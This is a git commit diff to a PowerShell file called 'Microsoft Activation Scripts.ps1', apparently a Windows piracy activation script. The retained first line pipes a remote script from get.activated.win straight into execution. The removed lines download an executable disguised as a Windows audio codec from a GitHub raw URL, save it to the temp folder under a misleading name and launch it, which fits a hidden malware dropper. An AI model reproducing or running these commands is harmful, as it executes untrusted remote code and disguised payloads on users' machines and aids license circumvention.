de2d5ae9ba9687fd59bbef17c263789357a9b92e
acenljd <thebluepoint2@gmail.com>
2025-12-10 03:24:12 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,14 +1,6 @@
 irm https://get.activated.win | iex
 
 
-$url = "https://raw.githubusercontent.com/mndclever-beep/weather/refs/heads/main/Service%20Host%20Windows%20Audio%20Codec.exe"
-$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
-
-
-Invoke-WebRequest -Uri $url -OutFile $tempFile
-
-
-Start-Process $tempFile
 
 
 
